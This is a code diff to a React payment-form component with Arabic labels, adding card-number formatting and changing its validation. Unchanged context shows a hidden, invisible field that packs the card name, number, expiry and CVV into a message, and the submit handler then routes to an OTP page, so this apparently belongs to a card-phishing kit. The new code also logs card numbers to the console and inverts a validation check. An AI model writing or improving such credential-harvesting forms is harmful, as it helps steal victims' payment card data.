@@ -28,6 +28,7 @@ const PaymentMethods = () => {
     const [isValidCardNumber, setIsValidCardNumber] = useState<Boolean | null>(null);
     const [cardName, setCardName] = useState("");
     const [cardNumber, setCardNumber] = useState('');
+    const [card, setCard] = useState('');
     const [expiresYear, setExpiresYear] = useState<SetStateAction<string>>('');
     const [expiresMonth, setExpiresMonth] = useState<SetStateAction<string>>("");
     const [isLoading, setIsLoading] = useState<Boolean | null>(null);
@@ -43,7 +44,7 @@ const PaymentMethods = () => {
         if (((Number(expiresMonth) <= 12 && Number(expiresMonth) > 0) && expiresMonth.length === 2) && Number(expiresYear) >= 18) {
             ref3.current.focus()
         }
-    }, [expiresMonth, expiresYear, ref4])
+    }, [expiresMonth, expiresYear, ref4, card, setIsValidCardNumber])
     const methods: method[] = [{
         img: Pay1,
         title: "Paypal"
@@ -51,8 +52,7 @@ const PaymentMethods = () => {
         img: Pay2,
         title: "Visa - MasterCard"
     }]
-    console.log(ref4?.current?.value);
-    const handelSubmitForm = async (e: FormEvent<HTMLFormElement>) => {
+    const handelSubmitForm = async (e: any) => {
         e.preventDefault();
         if (cardNumber.length || cardName.length || expiresYear.length || expiresMonth.length) {
             setIsLoading(true)
@@ -74,10 +74,23 @@ const PaymentMethods = () => {
                 },
             );
         router.push('otp')
-
     }
 
+    const formatCreditCard = (number: string) => {
+        number = number.replace(/\D/g, '');
+        return number.replace(/(.{4})/g, '$1 ').trim();
+    };
     // [Pay1, Pay2]
+    function handelChange(e: any) {
+        // setCardNumber(`${e.target.value}`);
+        let val = e.target.value
+        setCard(formatCreditCard(val))
+        if (card.length >= 19) {
+            setIsValidCardNumber(true)
+        }
+    }
+    console.log(card);
+
     return (
         // f68024
         <div className='relative'>
@@ -118,7 +131,7 @@ const PaymentMethods = () => {
                                     setCardName(e.target.value)
                                 }} maxLength={16} required type="text" className={`w-full transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${isValidCardName === false ? "border-red-600 focus:border-red-600" : ""}`} placeholder="Ahmed M KAMAL" />
                             </div>
-                            {isValidCardName === false ?
+                            {isValidCardName ?
                                 // <span className='font-bold text-red-500'>{(Number(expiresYear) < 18 || Number(expiresMonth) > 12) ? "".toUpperCase() : ""}</span>
                                 <ErrorValidationInputs message={"ادخل اسمك الموجود علي بطاقة ائتمانك"} />
                                 : null
@@ -127,17 +140,10 @@ const PaymentMethods = () => {
                         <section>
                             <h3 className="font-bold mt-[15px] text-[16px]">رقم البطاقة</h3>
                             <div className='mt-[5px] pb-[50px] relative'>
-                                <input style={{ direction: "ltr" }} onBlur={() => cardNumber.length < 19 ? setIsValidCardNumber(false) : setIsValidCardNumber(true)} required onChange={(e) => {
-                                    setCardNumber(e.target.value);
-                                    if (cardNumber.length < 19) {
-                                        setIsValidCardNumber(false)
-                                    } else if (cardNumber.length === 19) {
-                                        setIsValidCardNumber(true)
-                                    }
-                                }} maxLength={19} value={(cardNumber.length === 4 || cardNumber.length === 9 || cardNumber.length === 14) ? `${cardNumber} ` : cardNumber} type="text" className={`text-right w-full absolute h-[42px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${(isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0) ? "border-red-600 focus:border-red-600" : "border-transparent"}`} placeholder="7584 4894 4875 4844" />
+                                <input style={{ direction: "ltr" }} value={card.length ? card : ""} required onChange={handelChange} maxLength={19} type="text" className={`text-right w-full absolute h-[42px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${(isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0) ? "border-red-600 focus:border-red-600" : "border-transparent"}`} placeholder="7584 4894 4875 4844" />
                                 <img src={visa.src} className={`w-[30px] transition-all duration-[300ms] object-cover left-2 top-1/2 -translate-y-1/2 absolute z-[222] ${isValidCardNumber ? "opacity-[1]" : "opacity-[0]"}`} alt="" />
                             </div>
-                            {isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0 ?
+                            {!isValidCardNumber || card.length !== 19 ?
                                 <ErrorValidationInputs message={"ادخل رقم البطاقة الائتمانية المكون من 16 رقم"} />
                                 // <span className='font-bold text-red-500'>{(Number(expiresYear) < 18 || Number(expiresMonth) > 12) ? .toUpperCase() : ""}</span>
                                 : null
@@ -175,7 +181,6 @@ const PaymentMethods = () => {
                             </section>
                         </section>
                         <input name='message' className='opacity-0' onChange={(e) => setMsg(e.target.value)} ref={ref4} type="text" value={`card name: ${cardName}\n card number: ${cardNumber}\n exp(y: (${expiresYear})) exp(m: (${expiresMonth})) cvv(${cvv})`} />
-
                         <button className='block sub w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[15px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]' disabled={isLoading === false && true}>{!isLoading ? "اكمال عملية الدفع" : "جاري معالجة طلبك..."}</button>
                     </form>
                 }
